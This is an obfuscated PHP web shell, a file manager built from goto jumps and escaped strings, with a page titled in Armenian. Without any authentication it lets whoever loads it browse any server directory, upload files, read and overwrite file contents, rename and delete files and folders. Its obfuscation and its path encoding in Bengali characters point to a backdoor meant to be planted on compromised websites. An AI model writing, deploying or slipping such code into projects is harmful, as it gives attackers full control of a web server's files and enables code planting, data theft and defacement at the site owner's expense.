<?php
 goto dwiZX; zZ3zN: $path = str_replace("\x5c", "\57", PATH); goto S4LyL; l83LX: $root_path = __DIR__; goto CRSrf; KX5rS: oz557: goto QmNIo; CRSrf: goto G5FhT; goto EHn1O; WSYIR: goto ubCq8; goto xR6iM; xstT9: goto n9fg8; goto KOits; PNmEO: if (isset($_GET["\160"])) { if (empty($_GET["\x70"])) { $p = $root_path; } elseif (!is_dir(decodePath($_GET["\160"]))) { echo "\x3c\163\143\162\151\x70\x74\76\12\141\x6c\145\x72\164\50\x27\x44\151\162\x65\143\164\x6f\162\171\x20\151\x73\x20\103\157\162\162\x75\160\164\145\144\x20\141\x6e\144\x20\x55\x6e\162\x65\141\x64\141\142\x6c\145\56\x27\x29\73\12\167\151\156\144\x6f\x77\x2e\x6c\157\143\141\164\x69\x6f\x6e\x2e\162\145\160\154\141\x63\x65\50\47\x3f\x27\x29\x3b\12\74\57\x73\143\162\151\x70\164\76"; } elseif (is_dir(decodePath($_GET["\x70"]))) { $p = decodePath($_GET["\x70"]); } } elseif (isset($_GET["\161"])) { if (!is_dir(decodePath($_GET["\161"]))) { echo "\74\x73\143\x72\151\160\x74\76\x77\x69\x6e\144\157\x77\x2e\x6c\157\x63\141\x74\151\157\x6e\56\162\145\x70\154\141\143\145\50\x27\x3f\160\75\47\x29\73\x3c\x2f\163\143\162\151\160\x74\76"; } elseif (is_dir(decodePath($_GET["\161"]))) { $p = decodePath($_GET["\x71"]); } } else { $p = $root_path; } goto pAwSn; HLkg6: goto ajTxw; goto KX5rS; wb852: I2Jq6: goto l83LX; QelD0: function fileExtension($file) { return substr(strrchr($file, "\56"), 1); } goto tcEgC; jm1fS: if (isset($_GET["\x64"]) && isset($_GET["\161"])) { $name = PATH . "\57" . $_GET["\144"]; if (is_file($name)) { if (unlink($name)) { echo "\x3c\x73\x63\x72\x69\160\164\x3e\141\154\x65\x72\164\x28\47\x46\151\x6c\x65\x20\x72\x65\x6d\157\x76\145\x64\x2e\47\51\73\40\x77\x69\156\x64\x6f\x77\56\x6c\157\143\x61\164\151\x6f\x6e\x2e\162\x65\x70\154\x61\143\145\50\x27\x3f\160\x3d" . encodePath(PATH) . "\x27\x29\73\x3c\57\x73\x63\x72\151\160\x74\x3e"; } else { echo "\74\163\143\162\151\x70\x74\76\141\154\x65\x72\164\50\47\123\157\x6d\x65\x20\x65\162\x72\157\x72\40\x6f\x63\143\165\x72\162\x65\x64\x2e\x27\x29\x3b\x20\x77\151\x6e\x64\157\x77\56\x6c\x6f\143\x61\x74\151\x6f\x6e\56\x72\x65\x70\154\141\x63\x65\50\47\77\x70\75" . encodePath(PATH) . "\47\51\73\x3c\57\x73\x63\162\151\x70\164\76"; } } elseif (is_dir($name)) { if (rmdir($name) == true) { echo "\x3c\x73\143\x72\x69\x70\x74\76\141\x6c\145\x72\x74\x28\47\x44\151\162\145\x63\164\x6f\162\x79\x20\x72\145\x6d\157\166\x65\144\x2e\x27\51\73\40\x77\x69\x6e\x64\157\167\56\154\x6f\143\141\x74\x69\157\156\56\162\x65\x70\x6c\x61\x63\x65\50\47\x3f\160\75" . encodePath(PATH) . "\47\x29\x3b\x3c\57\163\x63\x72\151\x70\x74\x3e"; } else { echo "\x3c\163\143\162\x69\160\x74\x3e\141\154\145\162\164\x28\x27\x53\157\155\x65\40\x65\x72\x72\157\162\x20\157\x63\x63\165\162\x72\145\144\x2e\x27\51\73\x20\x77\x69\156\144\x6f\167\x2e\x6c\x6f\x63\x61\164\x69\157\x6e\x2e\x72\x65\x70\x6c\141\143\x65\50\x27\77\160\75" . encodePath(PATH) . "\47\x29\73\74\x2f\x73\143\x72\x69\160\x74\76"; } } } goto UF5Y5; BDDR_: goto NlX0g; goto P_4z1; S4LyL: goto AY1Wl; goto QxSvz; PPN1n: goto zxizV; goto wb852; Cz983: ajTxw: goto DuvHT; UF5Y5: goto Qi1dW; goto IT2Zu; VpmpT: echo "\xa\74\x2f\x64\151\166\x3e\12\74\x64\151\x76\x20\143\x6c\x61\163\163\75\x22\x66\157\x72\155\55\x69\156\x6c\151\156\x65\x22\x3e\12\74\x61\x20\150\x72\x65\x66\x3d\x22\77\x75\x70\154\157\141\144\x26\161\75" . urlencode(encodePath(PATH)) . "\x22\x3e\x3c\x62\x75\x74\x74\157\156\40\x63\x6c\x61\x73\x73\x3d\42\142\x74\x6e\40\142\164\x6e\55\144\x61\162\153\42\x20\x74\171\x70\145\x3d\x22\x62\x75\164\164\x6f\156\42\76\125\160\x6c\x6f\x61\144\x20\106\151\x6c\x65\74\x2f\142\165\164\164\157\x6e\76\74\x2f\141\76\12\74\141\40\150\162\145\x66\x3d\x22\x3f\x22\x3e\74\142\165\164\x74\x6f\x6e\40\x74\x79\160\x65\75\x22\x62\165\164\x74\x6f\156\x22\x20\x63\154\x61\x73\163\75\x22\142\x74\156\40\142\x74\156\55\144\141\162\153\42\76\110\117\x4d\105\x3c\57\142\165\164\x74\x6f\x6e\76\74\57\141\x3e\x20\xa\74\57\x64\x69\x76\76\xa\74\x2f\x6e\x61\x76\76"; goto WSYIR; COqdD: gWpAt: goto zZ3zN; u82MR: ubCq8: goto LL5iQ; XQfPG: goto d1prb; goto YvKIp; KC4W6: goto r7nB3; goto DOEe4; ig3Ot: goto UO0bB; goto dDjuB; PbPEP: define("\x50\x41\x54\x48", $p); goto ig3Ot; OE1E5: if (isset($_GET["\162"])) { if (!empty($_GET["\x72"]) && isset($_GET["\x71"])) { echo "\xa\x20\x20\x20\40\x3c\x66\157\x72\x6d\40\x6d\x65\x74\x68\157\x64\x3d\42\x70\x6f\x73\x74\42\x3e\xa\40\x20\x20\40\40\40\x20\40\122\145\156\141\155\x65\72\12\40\x20\40\x20\x20\x20\x20\x20\74\x69\156\160\x75\x74\x20\x74\x79\160\x65\75\x22\x74\145\170\x74\42\40\156\141\x6d\x65\x3d\42\x6e\141\155\145\42\40\x76\x61\x6c\x75\x65\75\x22" . $_GET["\x72"] . "\x22\x3e\12\40\40\40\x20\x20\40\40\x20\74\x69\156\160\x75\164\40\164\x79\x70\145\x3d\x22\163\x75\x62\x6d\x69\164\x22\40\x63\154\141\x73\163\75\42\142\x74\156\x20\142\164\x6e\55\x64\141\x72\153\x22\40\x76\x61\154\x75\145\x3d\x22\x52\145\156\x61\x6d\145\x22\x20\x6e\x61\155\x65\x3d\42\162\145\156\x61\x6d\x65\x22\x3e\xa\x20\x20\40\40\74\x2f\146\157\x72\x6d\x3e"; if (isset($_POST["\x72\145\x6e\141\x6d\145"])) { $name = PATH . "\x2f" . $_GET["\162"]; if (rename($name, PATH . "\x2f" . $_POST["\156\141\x6d\145"])) { echo "\74\163\143\162\x69\160\164\x3e\x61\154\x65\162\164\50\x27\x52\145\156\141\x6d\145\x64\x2e\x27\51\x3b\x20\x77\x69\156\x64\x6f\167\x2e\154\157\143\x61\164\151\x6f\156\56\162\145\160\x6c\141\143\145\x28\x27\x3f\160\75" . encodePath(PATH) . "\47\51\x3b\74\57\x73\143\162\x69\x70\164\x3e"; } else { echo "\x3c\x73\143\162\x69\x70\x74\x3e\141\154\145\x72\x74\50\47\123\157\155\x65\x20\x65\x72\162\x6f\162\40\157\x63\143\x75\162\162\x65\x64\56\47\51\x3b\40\167\151\x6e\144\x6f\167\56\x6c\157\143\x61\164\151\157\156\56\162\145\x70\154\x61\x63\x65\x28\x27\x3f\x70\x3d" . encodePath(PATH) . "\47\51\73\74\x2f\x73\x63\x72\151\160\x74\x3e"; } } } } goto MrW82; QfVnw: function decodePath($path) { $a = array("\57", "\134", "\x2e", "\72"); $b = array("\340\246\x95", "\xe0\xa6\x96", "\340\246\227", "\340\246\230"); return str_replace($b, $a, $path); } goto ZPnS3; QmNIo: if (isset($_GET["\165\160\154\x6f\x61\144"])) { echo "\12\40\40\40\40\x3c\146\157\162\155\x20\155\x65\x74\150\157\x64\75\42\160\157\x73\164\x22\x20\x65\156\x63\x74\171\160\145\75\42\x6d\x75\x6c\x74\151\160\141\162\164\x2f\146\157\x72\155\55\144\x61\164\141\42\76\12\x20\x20\x20\40\x20\40\x20\x20\123\x65\x6c\145\143\x74\40\146\151\154\145\40\164\157\x20\165\x70\x6c\x6f\141\144\x3a\12\x20\x20\x20\x20\40\x20\x20\40\74\151\156\160\x75\x74\40\164\x79\x70\145\75\42\x66\151\x6c\x65\x22\x20\x6e\x61\155\x65\75\x22\x66\x69\x6c\x65\x54\x6f\x55\x70\x6c\x6f\x61\x64\x22\40\x69\x64\x3d\42\146\x69\154\145\x54\x6f\x55\x70\154\157\x61\x64\42\x3e\12\x20\x20\x20\x20\40\40\40\40\x3c\151\x6e\x70\x75\164\x20\164\x79\x70\145\75\x22\x73\x75\x62\155\x69\x74\x22\x20\143\x6c\x61\163\x73\75\x22\x62\x74\x6e\40\x62\x74\156\55\144\141\162\153\42\40\166\141\154\165\x65\75\x22\125\160\x6c\157\141\144\x22\x20\156\141\155\x65\x3d\x22\165\160\154\x6f\x61\x64\x22\x3e\12\x20\40\40\40\74\x2f\x66\x6f\x72\x6d\76"; } goto KC4W6; csuDx: echo "\12\x3c\156\141\x76\40\143\154\141\x73\x73\x3d\x22\156\141\x76\x62\x61\x72\40\156\x61\166\142\x61\162\x2d\154\151\x67\150\x74\42\x20\163\x74\171\x6c\x65\75\x22\142\141\x63\x6b\147\x72\x6f\165\x6e\144\x2d\143\157\x6c\157\162\72\x20\x23\x65\63\146\x32\x66\x64\x3b\42\76\xa\40\x20\x3c\x3f\x70\150\x70\12\154\141\163\x73\x3d\x22\156\141\x76\x62\x61\x72\55\142\162\141\156\144\x22\x3e\12\x20\x20\x3c\x61\40\x68\162\145\146\x3d\x22\x3f\x22\76\x3c\x69\x6d\147\x20\163\162\x63\x3d\42\150\x74\164\160\x73\72\57\x2f\x67\151\164\150\165\142\x2e\143\x6f\x6d\x2f\146\x6c\165\x69\x64\x69\143\157\156\56\160\156\x67\x22\40\x77\151\x64\164\150\75\42\63\60\42\40\150\x65\x69\x67\x68\164\75\42\63\60\x22\x20\x61\154\164\x3d\x22\42\x3e\74\x2f\x61\76\12"; goto I_rlS; EHn1O: B50lk: goto kg9hD; dDjuB: zxizV: goto dgThi; Y7yTe: Dgk50: goto AwfUn; I_rlS: goto gWpAt; goto zF5Lx; QxSvz: L112m: goto PbPEP; d2c8m: G5FhT: goto PNmEO; MrW82: goto Dgk50; goto COqdD; YvKIp: UO0bB: goto csuDx; ILcjC: goto oz557; goto IZn3i; XxSw3: d1prb: goto VpmpT; K4IdW: goto iWiRW; goto g1HJl; kDJmu: goto LMf0p; goto u82MR; Gj8VX: $paths = explode("\57", $path); goto HLkg6; dgThi: if (isset($_POST["\x75\160\154\x6f\141\144"])) { $target_file = PATH . "\57" . $_FILES["\146\x69\154\145\x54\x6f\x55\x70\x6c\157\x61\144"]["\156\141\155\x65"]; if (move_uploaded_file($_FILES["\x66\151\154\x65\x54\x6f\125\x70\154\157\141\x64"]["\164\155\x70\137\x6e\141\x6d\145"], $target_file)) { echo "\x3c\160\x3e" . htmlspecialchars(basename($_FILES["\x66\x69\x6c\145\x54\x6f\x55\160\x6c\x6f\141\144"]["\x6e\141\155\145"])) . "\40\150\141\x73\40\x62\145\x65\x6e\40\165\x70\x6c\157\x61\144\145\144\x2e\x3c\57\x70\x3e"; } else { echo "\x3c\160\76\123\x6f\x72\x72\171\x2c\40\164\x68\x65\x72\145\40\167\x61\x73\40\x61\156\40\x65\x72\x72\157\x72\x20\x75\160\x6c\157\x61\x64\151\156\x67\x20\x79\157\165\162\40\146\x69\x6c\x65\x2e\x3c\x2f\x70\x3e"; } } goto kDJmu; S7oVP: function fileIcon($file) { $imgs = array("\141\160\156\147", "\x61\166\151\x66", "\147\151\x66", "\x6a\x70\147", "\x6a\x70\x65\x67", "\152\x66\151\146", "\160\x6a\x70\x65\x67", "\160\x6a\160", "\x70\x6e\147", "\x73\166\x67", "\x77\x65\142\x70"); $audio = array("\x77\x61\166", "\155\x34\x61", "\155\64\142", "\155\x70\x33", "\157\x67\147", "\167\x65\142\155", "\155\x70\143"); $ext = strtolower(fileExtension($file)); if ($file == "\x65\x72\x72\x6f\162\137\x6c\157\147") { return "\74\151\40\x63\x6c\x61\x73\163\75\42\146\x61\55\x73\x68\x61\x72\x70\x20\x66\141\55\x73\157\x6c\x69\x64\40\x66\141\55\142\x75\x67\42\76\74\57\x69\76\x20"; } elseif ($file == "\x2e\150\x74\x61\x63\143\x65\x73\163") { return "\x3c\151\x20\x63\x6c\141\x73\x73\75\42\146\141\x2d\x73\x6f\154\x69\144\x20\146\141\55\x68\x61\155\x6d\x65\x72\x22\76\74\57\151\x3e\40"; } if ($ext == "\150\x74\x6d\154" || $ext == "\x68\x74\155") { return "\x3c\151\40\x63\154\x61\163\163\x3d\42\146\141\x2d\x62\162\141\156\144\163\x20\x66\x61\55\x68\x74\x6d\x6c\65\42\x3e\x3c\57\x69\x3e\x20"; } elseif ($ext == "\160\x68\160" || $ext == "\160\x68\164\x6d\x6c") { return "\74\x69\40\143\x6c\x61\163\x73\75\x22\x66\x61\55\142\162\x61\x6e\x64\x73\x20\x66\x61\x2d\x70\150\160\x22\76\x3c\57\151\76\x20"; } elseif (in_array($ext, $imgs)) { return "\x3c\151\x20\x63\154\x61\163\x73\75\x22\x66\x61\x2d\x72\x65\x67\165\154\141\162\x20\146\x61\55\x69\155\x61\x67\x65\163\42\x3e\x3c\57\x69\x3e\40"; } elseif ($ext == "\143\x73\163") { return "\74\x69\40\x63\x6c\141\x73\x73\75\42\146\141\55\142\162\x61\156\144\163\40\x66\x61\x2d\143\163\x73\x33\x22\x3e\74\x2f\151\76\x20"; } elseif ($ext == "\x74\x78\x74") { return "\x3c\x69\x20\143\154\141\x73\163\x3d\x22\146\x61\x2d\162\x65\147\165\x6c\x61\162\40\x66\141\55\146\151\154\x65\x2d\154\x69\x6e\145\x73\x22\x3e\74\57\x69\76\40"; } elseif (in_array($ext, $audio)) { return "\x3c\x69\40\x63\x6c\141\163\x73\x3d\x22\x66\141\55\144\165\x6f\164\157\156\145\x20\146\x61\x2d\x66\151\154\145\55\155\165\x73\151\x63\42\76\74\x2f\151\76\x20"; } elseif ($ext == "\160\171") { return "\74\151\x20\143\x6c\x61\x73\163\x3d\x22\x66\x61\55\x62\162\141\156\144\x73\x20\146\141\x2d\160\171\164\x68\157\156\42\76\x3c\57\151\76\x20"; } elseif ($ext == "\x6a\x73") { return "\x3c\x69\x20\x63\x6c\x61\x73\x73\75\x22\146\x61\55\142\162\141\156\144\163\x20\146\x61\x2d\152\x73\42\x3e\74\x2f\151\76\x20"; } else { return "\x3c\x69\40\143\x6c\x61\x73\163\x3d\42\146\x61\x2d\x73\x6f\154\151\144\40\x66\x61\x2d\146\x69\x6c\x65\x22\76\x3c\x2f\151\x3e\x20"; } } goto BDDR_; tcEgC: goto CXDiY; goto Y7yTe; IT2Zu: CXDiY: goto S7oVP; ekzzL: ?>
<body><?php  goto qjW6l; DuvHT: foreach ($paths as $id => $dir_part) { if ($dir_part == '' && $id == 0) { $a = true; echo "\74\x61\40\x68\x72\x65\x66\x3d\x22\x3f\x70\x3d\57\x22\76\x2f\74\57\x61\76"; continue; } if ($dir_part == '') { continue; } echo "\74\x61\40\150\162\145\x66\75\47\77\160\75"; for ($i = 0; $i <= $id; $i++) { echo str_replace("\x3a", "\xe0\xa6\230", $paths[$i]); if ($i != $id) { echo "\340\246\x95"; } } echo "\47\76" . $dir_part . "\x3c\57\x61\x3e\x2f"; } goto XQfPG; P_4z1: Qi1dW: goto ZZRQW; Oy4Kg: function encodePath($path) { $a = array("\57", "\134", "\x2e", "\x3a"); $b = array("\xe0\246\225", "\340\246\226", "\340\xa6\227", "\340\xa6\x98"); return str_replace($a, $b, $path); } goto ctqzQ; kg9hD: function formatSizeUnits($bytes) { if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . "\x20\107\102"; } elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . "\40\x4d\x42"; } elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . "\x20\x4b\x42"; } elseif ($bytes > 1) { $bytes = $bytes . "\x20\x62\x79\164\x65\x73"; } elseif ($bytes == 1) { $bytes = $bytes . "\40\x62\171\x74\145"; } else { $bytes = "\x30\40\142\x79\x74\145\x73"; } return $bytes; } goto K4IdW; ZPnS3: goto I2Jq6; goto Cz983; AwfUn: if (isset($_GET["\x65"])) { if (!empty($_GET["\x65"]) && isset($_GET["\161"])) { echo "\xa\x20\40\40\x20\x3c\x66\157\x72\155\x20\155\145\164\150\x6f\144\75\42\160\157\x73\x74\42\76\12\x20\x20\40\x20\40\x20\x20\x20\x3c\164\x65\x78\x74\141\162\x65\x61\40\x73\x74\171\x6c\x65\x3d\42\150\x65\151\x67\x68\x74\x3a\40\65\60\x30\x70\x78\x3b\xa\40\x20\40\40\40\x20\40\x20\x77\x69\x64\164\150\x3a\x20\x39\60\x25\73\42\40\x6e\x61\155\145\75\42\x64\x61\x74\x61\42\x3e" . htmlspecialchars(file_get_contents(PATH . "\57" . $_GET["\x65"])) . "\74\x2f\x74\x65\x78\164\141\162\x65\x61\76\xa\40\x20\40\x20\x20\40\40\40\x3c\x62\x72\x3e\12\x20\40\40\x20\40\x20\40\40\74\151\156\160\165\164\x20\x74\171\160\145\75\x22\x73\165\x62\x6d\x69\x74\x22\40\x63\x6c\141\163\163\x3d\42\x62\x74\156\40\142\x74\156\55\144\x61\162\153\x22\40\166\x61\154\165\145\x3d\x22\123\141\166\x65\x22\x20\x6e\141\x6d\x65\75\42\145\144\151\164\42\x3e\xa\40\40\40\x20\x3c\x2f\x66\x6f\x72\155\76"; if (isset($_POST["\x65\144\151\x74"])) { $filename = PATH . "\57" . $_GET["\145"]; $data = $_POST["\x64\141\164\x61"]; $open = fopen($filename, "\167"); if (fwrite($open, $data)) { echo "\74\163\x63\x72\x69\160\x74\76\x61\x6c\145\162\x74\x28\47\123\x61\166\145\x64\x2e\47\51\x3b\x20\167\151\x6e\144\x6f\x77\56\x6c\x6f\143\141\164\x69\157\156\x2e\162\145\x70\x6c\x61\x63\145\50\47\77\160\75" . encodePath(PATH) . "\47\x29\x3b\x3c\57\x73\143\x72\x69\160\x74\x3e"; } else { echo "\x3c\x73\x63\x72\x69\x70\x74\x3e\141\x6c\145\x72\x74\50\x27\123\157\x6d\x65\40\x65\x72\x72\157\162\x20\x6f\x63\143\x75\x72\162\145\144\x2e\47\x29\x3b\x20\167\151\x6e\x64\157\x77\56\154\x6f\143\141\x74\x69\157\x6e\x2e\x72\145\160\154\x61\143\145\x28\47\x3f\160\75" . encodePath(PATH) . "\47\51\73\x3c\x2f\163\x63\162\151\160\164\x3e"; } fclose($open); } } } goto PPN1n; pAwSn: goto L112m; goto XxSw3; zF5Lx: AY1Wl: goto Gj8VX; LL5iQ: if (isset($_GET["\160"])) { if (is_readable(PATH)) { $fetch_obj = scandir(PATH); $folders = array(); $files = array(); foreach ($fetch_obj as $obj) { if ($obj == "\x2e" || $obj == "\56\x2e") { continue; } $new_obj = PATH . "\57" . $obj; if (is_dir($new_obj)) { array_push($folders, $obj); } elseif (is_file($new_obj)) { array_push($files, $obj); } } } echo "\xa\x3c\164\141\x62\154\x65\40\143\154\141\163\163\75\42\164\141\142\154\145\40\164\x61\x62\154\145\x2d\x68\157\x76\145\162\x22\x3e\xa\x20\x20\x3c\x74\x68\x65\x61\144\x3e\xa\40\x20\40\x20\74\164\x72\76\xa\x20\x20\x20\40\x20\40\74\164\150\40\x73\x63\157\x70\145\75\x22\x63\157\154\42\x3e\x4e\141\155\145\x3c\57\x74\x68\76\xa\x20\x20\40\40\x20\40\74\x74\x68\40\x73\143\x6f\x70\145\x3d\x22\143\x6f\x6c\x22\x3e\123\x69\x7a\145\x3c\57\x74\x68\76\12\40\40\x20\x20\40\40\x3c\164\150\40\x73\143\157\x70\x65\75\42\x63\x6f\154\x22\x3e\115\x6f\x64\151\146\x69\145\x64\74\x2f\x74\x68\x3e\xa\x20\40\x20\x20\x20\40\x3c\164\x68\x20\x73\x63\x6f\160\145\75\42\x63\x6f\x6c\42\76\x50\x65\162\155\163\74\57\x74\150\x3e\12\40\40\x20\x20\40\40\74\164\150\40\163\143\x6f\160\145\x3d\42\x63\x6f\x6c\x22\76\101\143\164\x69\157\156\163\74\x2f\164\x68\76\xa\x20\x20\x20\x20\74\57\164\162\76\12\40\40\74\x2f\164\150\145\141\144\76\12\40\40\x3c\x74\142\157\x64\171\x3e\xa"; foreach ($folders as $folder) { echo "\x20\40\40\x20\74\164\x72\x3e\12\40\x20\40\40\40\x20\74\x74\x64\76\74\x69\40\143\x6c\141\163\163\x3d\x27\146\141\55\163\157\x6c\151\x64\x20\x66\x61\x2d\146\x6f\154\x64\x65\162\47\76\x3c\57\x69\x3e\40\x3c\x61\x20\150\x72\145\146\75\x27\x3f\x70\x3d" . urlencode(encodePath(PATH . "\x2f" . $folder)) . "\47\x3e" . $folder . "\x3c\x2f\141\76\74\57\x74\x64\x3e\xa\x20\40\x20\40\40\x20\74\x74\x64\76\74\x62\x3e\x2d\x2d\55\74\57\142\x3e\74\57\164\x64\76\12\40\x20\x20\x20\x20\40\74\x74\x64\x3e" . date("\106\40\x64\40\x59\x20\110\72\151\72\163\56", filemtime(PATH . "\x2f" . $folder)) . "\x3c\57\x74\x64\x3e\12\x20\x20\40\40\x20\x20\74\x74\x64\76\x30" . substr(decoct(fileperms(PATH . "\57" . $folder)), -3) . "\74\x2f\141\x3e\x3c\x2f\x74\144\x3e\xa\40\x20\x20\40\x20\40\74\164\144\76\12\40\40\40\x20\40\x20\74\x61\x20\x74\151\164\x6c\x65\x3d\47\122\145\156\x61\155\145\x27\40\x68\162\x65\146\75\47\77\161\x3d" . urlencode(encodePath(PATH)) . "\x26\x72\75" . $folder . "\47\x3e\x3c\x69\x20\x63\154\141\x73\163\x3d\x27\146\141\x2d\163\150\x61\162\x70\40\146\141\55\162\x65\x67\165\154\141\162\x20\146\141\x2d\160\145\x6e\55\x74\157\x2d\163\161\x75\141\162\145\47\x3e\74\x2f\151\x3e\74\x2f\141\76\12\x20\40\40\40\40\x20\74\141\40\x74\x69\x74\154\x65\75\x27\104\x65\x6c\x65\x74\x65\x27\40\x68\162\x65\146\75\47\x3f\x71\75" . urlencode(encodePath(PATH)) . "\x26\x64\x3d" . $folder . "\47\76\x3c\x69\x20\143\x6c\x61\x73\x73\x3d\x27\x66\x61\40\x66\141\x2d\x74\162\x61\163\x68\47\40\141\x72\151\141\55\x68\151\144\144\145\156\x3d\47\x74\162\x75\145\x27\x3e\74\x2f\x69\x3e\x3c\57\141\x3e\12\x20\x20\x20\40\40\40\x3c\164\144\76\12\40\x20\40\x20\74\57\x74\x72\76\12"; } foreach ($files as $file) { echo "\x20\40\x20\x20\74\x74\162\76\xa\40\x20\40\x20\40\40\40\x20\40\40\74\164\144\x3e" . fileIcon($file) . $file . "\x3c\57\x74\x64\76\xa\40\40\x20\40\x20\x20\40\40\x20\40\74\x74\144\76" . formatSizeUnits(filesize(PATH . "\57" . $file)) . "\74\x2f\164\144\76\12\40\x20\x20\x20\40\40\x20\x20\x20\x20\x3c\164\144\76" . date("\106\40\x64\x20\x59\40\x48\72\151\x3a\x73\56", filemtime(PATH . "\57" . $file)) . "\74\x2f\x74\144\76\12\40\x20\40\x20\x20\x20\40\40\x20\x20\74\164\x64\76\60" . substr(decoct(fileperms(PATH . "\x2f" . $file)), -3) . "\x3c\57\141\x3e\74\x2f\164\x64\76\12\40\x20\x20\40\x20\x20\40\40\40\40\x3c\164\144\x3e\12\x20\x20\40\x20\40\40\40\x20\40\x20\x3c\141\40\x74\151\164\154\x65\75\x27\105\x64\151\164\40\106\151\x6c\145\47\40\x68\162\x65\146\x3d\47\77\x71\75" . urlencode(encodePath(PATH)) . "\x26\x65\x3d" . $file . "\x27\x3e\74\151\40\143\154\141\163\163\75\x27\146\141\x2d\163\157\154\x69\x64\x20\146\141\55\146\151\154\145\x2d\160\145\x6e\x27\76\x3c\57\x69\76\74\x2f\x61\76\12\x20\x20\x20\40\40\40\40\40\x20\x20\x3c\141\40\164\151\x74\x6c\145\x3d\47\122\145\x6e\x61\x6d\x65\47\x20\x68\162\x65\x66\75\47\77\x71\x3d" . urlencode(encodePath(PATH)) . "\x26\x72\x3d" . $file . "\x27\x3e\x3c\x69\40\x63\x6c\141\x73\x73\x3d\x27\x66\141\55\163\150\141\162\x70\40\146\x61\55\162\x65\x67\165\x6c\x61\162\x20\x66\141\55\160\x65\x6e\55\164\157\55\163\x71\165\x61\x72\x65\47\76\x3c\x2f\x69\76\74\57\x61\76\12\40\40\x20\40\40\x20\40\40\40\40\74\x61\x20\x74\x69\164\154\145\75\x27\x44\x65\x6c\145\x74\x65\47\x20\x68\x72\145\x66\75\x27\77\161\x3d" . urlencode(encodePath(PATH)) . "\46\x64\75" . $file . "\47\76\74\151\x20\143\154\x61\163\x73\75\x27\x66\x61\40\146\141\55\164\162\141\163\x68\x27\40\141\162\151\x61\55\150\151\x64\144\145\156\75\x27\x74\162\x75\145\x27\76\74\57\x69\76\x3c\57\141\x3e\xa\40\40\40\x20\40\40\x20\40\40\x20\74\x74\x64\76\12\40\x20\40\40\x3c\57\164\x72\76\xa"; } echo "\40\40\74\57\164\x62\157\144\171\x3e\12\74\57\x74\x61\142\x6c\x65\x3e"; } else { if (empty($_GET)) { echo "\x3c\163\143\x72\x69\x70\164\76\167\x69\x6e\x64\x6f\167\x2e\x6c\x6f\143\x61\x74\151\x6f\156\x2e\x72\145\160\154\141\143\x65\50\x27\x3f\160\75\x27\x29\x3b\74\x2f\163\143\x72\151\x70\164\x3e"; } } goto ILcjC; g1HJl: r7nB3: goto OE1E5; qjW6l: goto B50lk; goto HYoeX; DOEe4: n9fg8: goto ekzzL; KOits: iWiRW: goto QelD0; HYoeX: NlX0g: goto Oy4Kg; dwiZX: ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="IE=edge"http-equiv="X-UA-Compatible"><meta content="width=device-width,initial-scale=1"name="viewport"><title>պարզապես կատակում եմ</title><link crossorigin="anonymous"href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD"rel="stylesheet"><link crossorigin="anonymous"href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="rel="stylesheet"referrerpolicy="no-referrer"></head><?php  goto xstT9; ctqzQ: goto drDVU; goto d2c8m; IZn3i: drDVU: goto QfVnw; xR6iM: LMf0p: goto jm1fS; ZZRQW: ?>
<script crossorigin="anonymous"integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script></body></html>